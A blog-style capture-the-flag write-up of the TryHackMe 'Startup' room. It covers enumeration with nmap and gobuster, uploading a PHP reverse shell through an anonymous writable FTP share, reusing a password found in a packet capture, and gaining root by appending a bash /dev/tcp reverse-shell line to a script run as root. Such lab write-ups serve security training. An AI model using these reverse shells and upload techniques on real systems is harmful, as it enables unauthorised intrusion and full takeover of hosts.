---
title: Writeup - THM - Startup
author: Fr3akazo1d!
date: 2020-11-09 
categories: [Hacking, CTF]
tags: [tryhackeme, Startup, Wireshark, spicy, cron, enumeration, gobuster]
image: /assets/img/thm-images/THM-Startup.png
---
# General Information

| Room        | Date        | Difficulty | Tags                                   | Time     |
| ----------- | ----------- | ---------- | -------------------------------------- | -------- |
| Startup     | 09.11.2020  | easy       | Wireshark, gobuster, cron, enumeration | 2h 40min |


# tasks

| ID| Status    | UUID    |Age | Done | Project     |     Description                       |
|-- |-----------|---------|----|------|-------------|---------------------------------------|
| 1 | Completed | cde461e7| 2h | 1h   | THM-Startup | Starting up Target.                   |
| 2 | Completed | e8728a9e| 2h | 2h   | THM-Startup | What is the secret spicy soup recipe? |   
| 3 | Completed | 59aaab62| 2h | 2h   | THM-Startup | What are the contents of user.txt     |
| 4 | Completed | 66e829ab| 2h | 2h   | THM-Startup | What are the contents of root.txt     |



# Duration

| Recorded "THM-Startup"       |
| ---------------------------- |
| Started 2020-11-09 T19:27:04 |
| Ended               22:06:21 |
| Total               2:39:17  |

# Used Programs

| Program  | Command |
| --------- | -------- |
| namp     | nmap -sC -sV -oN nmap/initial $ip|
| ftp | ftp $ip |
| gobuster | gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | 
| nc | nc -lnvp 9901 |

# open ports

| Port | Service     | Version             |
| ---- | ----------- | ------------------- |
| 21   | ftp-server  | vsftpd 3.0.3        |
| 22   | ssh         | OpenSSH 7.2p2       |
| 80   | Http-Server | Apache httpd 2.4.18 |

# Summary (Spoiler)

As always i have started with a nmap scan of the Target. The nmap scan shows me that there are three-ports open on the Target. 
The next step as i saw was a gobuster scan on the the Web-Server. Beside the gobuster scan i login in to the FTP-Server and check if there is something interessting on this ftp-share. I also saw a text file in the nmap scan output. 
The next step was to get access to Web-Server. This could be done with a reverse-shell uploaded to the FTP-Server. 

After that we cann run the php file and we get access to the server. 

On the Target we have to figure out how we can get to the user account. Because we are logged in as "www-data" and we have no rights to do anything on this target. 

On the target there is a Wireshark file located witch contains a password for the user. When we got the password we can loggin in and countiue for the root access. 

The root acces has something to do with cronjobs. I have addedd a bash reverse shell to the a specific file and then waited for the connection back to my machine. 
When the connection is done we have root rights on the target. 


# Start Enumeration 

## Nmap Scan-Output

```sh
❯ nmap -sC -sV -oA nmap/initial $ip -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 19:33 CET
Nmap scan report for 10.10.180.221
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp [NSE: writeable]
|_-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.170.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:67:c9:25:f8:04:62:85:4c:00:c0:95:95:62:97:cf (RSA)
|   256 dd:97:11:35:74:2c:dd:e3:c1:75:26:b1:df:eb:a4:82 (ECDSA)
|_  256 27:72:6c:e1:2a:a5:5b:d2:6a:69:ca:f9:b9:82:2c:b9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds
``` 

## notice.txt output 

output of text file form ftp-share:

```sh
bat notice.txt
───────┬──────────────────────────────────────────────────────────────────
       │ File: notice.txt
───────┼──────────────────────────────────────────────────────────────────
   1   │ Whoever is leaving these damn Among Us memes in this share, it IS
       │  NOT FUNNY. People downloading documents from our website will th
       │ ink we are a joke! Now I dont know who it is, but Maya is looking
       │  pretty sus.
───────┴──────────────────────────────────────────────────────────────────  
```

## test.log output

Found another file on the share (hidden file). 

output of the test.log file form FTP-share:

```sh
❯ bat test.log
───────┬──────────────────────────────────────────────────────────────────
       │ File: test.log
───────┼──────────────────────────────────────────────────────────────────
   1   │ test
───────┴──────────────────────────────────────────────────────────────────
```

## gobuster output

```sh
❯ gobuster dir -u http://startup.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://startup.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/10 08:19:18 Starting gobuster
===============================================================
/files (Status: 301)
/server-status (Status: 403)
===============================================================
2020/11/10 08:45:13 Finished
===============================================================
```

Gobuster shows me that there is a file-folder on the Web-Server. After checking the folder i know that this is the FTP-Folder. 


# Weaponization

After Enumeration the Web-Site, the FTP-Share i have figured out, how i can get access to the Web-Server. 

In the enuermation i found out, that the FTP-folder on the FTP-Share is writeaple:

```sh
drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp [NSE: writeable]
```

We can upload a reverse shell to the share and execute it from the Browser. This is possible due that fact that the ftp-folder is also accessible from the Web-Browser.

I used the php-reverse-shell scirpt witch is located in kali: 

```sh
❯ locate php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php\
```

In the script i changed the IP-Address and the port whitch i use for the reverse-shell to call back to me. 


# Delivery

The next step is deliver the reverse-shell to the ftp-folder. Due that fact that anonymous login is available we can upload the shell via command line to the ftp-folder. 

```sh
ftp startup.thm
Connected to startup.thm.
220 (vsFTPd 3.0.3)
Name (startup.thm:fr3akazo1d): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (1.7520 MB/s)
ftp>
```

Now we have a php-reverse-shell script on the FTP-Server: 

![Shell uploaded to FTP-Share](/assets/img/thm-images/THM-Startup-3.png)

# Exploitation

The Exploitation is a simple step on this target. We only have to run the shell.php script in the Web-Browser by simple clicking on the file. 

I have started a netcat listener on my machine so i get back the reverse shell: 

```sh
❯ nc -lnvp 9901
listening on [any] 9901 ...
connect to [10.9.170.39] from (UNKNOWN) [10.10.76.61] 50996
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:44:37 up 28 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ date
Tue Nov 10 07:44:59 UTC 2020
$ 
```

Now We can have a look into the Files. 

```sh
www-data@startup:/$ ls
ls
bin   etc   initrd.img.old  media  recipe.txt  snap  usr      vmlinuz.old
boot  home    lib     mnt  root      srv   vagrant
data  incidents   lib64     opt  run       sys   var
dev   initrd.img  lost+found    proc   sbin      tmp   vmlinuz
www-data@startup:/$ 
```

There is a file called "recipe.txt". when we cat this file we see the answer for the first Task of THM:

```sh
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was l***.
```

Now we can got for the User.txt file, whitch is located under the user lennie, because this is the only user on the target. We have to escalate our privilage to this user. 

At this moment i was stuck a quite long. Then i found an interesting file "suspicious.pcapng" in the incidents folder. 
This is a Wireshark capture and we can check if we find some interessting capture in there. 

So i downloaded the file and opened it with wireshark.

```sh
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ cd l****e
cd l****e
bash: cd: l****e: Permission denied
www-data@startup:/home$ ls
ls
l****e
www-data@startup:/home$ cd l****e
cd l****e
bash: cd: l****e: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c****************3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c****************3

sudo: 3 incorrect password attempts
www-data@startup:/home$ cat /etc/passwd
cat /etc/passwd
```

After checking the file i decided to follow the TCP-Stream of the Wireshark file. 
I found some interessting information in this Stream, it looks like there was in cyper incident befor and the attacker tried to sudo -l with a password. 

At this moment my mind was thinking, could this the password for user "l****e", i gave it a try and yes. this was the password!

```sh
www-data@startup:/incidents$ su l****e
su l****e
Password: c****************3

l****e@startup:/incidents$ 
```

I tried it with ssh if i can get a better bash on the target. 

```sh
$ ls
Documents  scripts  user.txt
$ id
uid=1002(l****e) gid=1002(l****e) groups=1002(l****e)
$ bash
l****e@startup:~$ ls
Documents  scripts  user.txt
l****e@startup:~$
```

It Worked, now i have access via ssh and i can go for root permissions. 

But first lets cat the user.txt file and finished task 2 from THM!

```sh
THM{0******************************9}
```


# Root-Enumeration

Now we have access via ssh we can look int some userfiles. Or other missconfiguration of the target to get to the root rights. 

In the user directory there are tow folders:

```sh 
l****e@startup:~$ ls
Documents  scripts  user.txt
l****e@startup:~$
```

The first folder i was checking was the "scripts" folder. There is bash script called "planner.sh". 
This script is calling another scirpt called "print.sh"

```sh
l****e@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

Lets find this file and check what is in the file:

```sh
l****e@startup:~/scripts$ find / -name print.sh 2>/dev/null
/etc/print.sh
```

The file is located in the "/etc" folder and it is owned by l****e and he has write access to the file:

```sh
l****e@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 l****e l****e 25 Nov  9 02:12 /etc/print.sh
```

# Exploitation to root

I was checking the cronjobs on the target, but i found nothing witch is calling the planner.sh scirpt in the user folder. But the "planner.sh" was owned by root. So i was thinking that there is a job running witch is calling the script. 

I have write access to the "print.sh" file. Maybe i can add a bash reverse-shell to the "print.sh" file and it will gave me a reverse-shell. 

# Weaponization to root

I got the revese-shell from pentestmonky 

```sh
bash -i >& /dev/tcp/10.9.170.39/8080 0>&1
```

I changed it to my ip address and added this to the "print.sh" file and started a listener on my machine:

```sh
echo "bash -i >& /dev/tcp/10.9.170.39/8080 0>&1" >> /etc/print.sh
```

```sh
l****e@startup:~/scripts$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
l****e@startup:~/scripts$ echo "bash -i >& /dev/tcp/10.9.170.39/8080 0>&1" >> /etc/print.sh
l****e@startup:~/scripts$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
bash -i >& /dev/tcp/10.9.170.39/8080 0>&1
```

Now i have to wait if there is a revershell comming back to me. 

After some minutes i got a reverse shell and i am logged in as root. 

```sh
❯ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.9.170.39] from (UNKNOWN) [10.10.76.61] 41020
bash: cannot set terminal process group (1916): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@startup:~# whoami
whoami
root
root@startup:~# 
```

So i rooted the target and i can read the root.txt file. 

```sh
root@startup:~# cat root.txt
cat root.txt
THM{f******************************d}
```

We now have closed all three task from THM and we shown the Startup-Company that the have to work on the security of there website. 

# Conclusion

This Room had not much new things on it but the user escalation was very interessting. But for the access to the target i was stuck i quite long. The enumeration with the wireshark capture was very interessting, this is something i haven't seen on any room of THM. 

As i saw the tag with cron, and i don't really saw the cronjob running for the root escalation. I have to work on the cronjobs. 

But for some last words. It was interessting and i takes me 2h and 40min to get to root access.

th4nks f0r r3ad1ng

Fr3akazo1d
